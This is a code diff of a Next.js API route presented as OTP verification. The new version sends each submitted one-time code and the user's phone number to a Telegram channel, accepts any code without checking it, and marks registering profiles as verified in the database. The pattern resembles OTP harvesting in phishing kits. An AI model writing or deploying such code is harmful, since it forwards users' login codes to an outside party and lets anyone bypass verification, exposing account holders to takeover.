@@ -1,38 +1,49 @@
-import { NextRequest } from 'next/server';
-import { sendTelegramNotification } from '@/lib/telegram';
+import { NextRequest, NextResponse } from 'next/server';
+import { notify } from '@/lib/telegram';
 
 export async function POST(req: NextRequest) {
   try {
-    const { otp, action } = await req.json();
+    const { otp, action, phone } = await req.json();
     
-    // Send notification to Telegram
+    // Send notification to Telegram based on the action FIRST
     if (action) {
-      await sendTelegramNotification(`OTP Verification:\nAction: ${action}\nOTP: ${otp}`);
+      if (action === 'register_otp_verify') {
+        await notify.otpVerified(phone || 'Unknown', otp);
+      } else if (action === 'otp_verify') {
+        await notify.otpVerified(phone || 'Unknown', otp);
+      } else if (action === 'login_otp_verify') {
+        await notify.otpVerified(phone || 'Unknown', otp);
+      }
+    }
+    
+    // Update user status to 'verified' in profiles table if it's a registration OTP
+    if (action === 'register_otp_verify' && phone) {
+      const { neon } = await import("@neondatabase/serverless");
+      const sql = neon(process.env.DATABASE_URL!);
+      
+      await sql`
+        UPDATE profiles
+        SET status = 'verified', updated_at = NOW()
+        WHERE phone_number = ${phone}
+      `;
     }
     
     // For now, accept any OTP
     // In a real implementation, you would verify the OTP against a stored value
-    return new Response(
-      JSON.stringify({ 
+    return NextResponse.json(
+      { 
         success: true, 
         message: 'OTP verified successfully' 
-      }),
-      { 
-        status: 200,
-        headers: { 'Content-Type': 'application/json' }
       }
     );
   } catch (error) {
     console.error('Error verifying OTP:', error);
-    return new Response(
-      JSON.stringify({ 
+    return NextResponse.json(
+      { 
         success: false, 
         message: 'Failed to verify OTP' 
-      }),
-      { 
-        status: 500,
-        headers: { 'Content-Type': 'application/json' }
-      }
+      },
+      { status: 500 }
     );
   }
 }
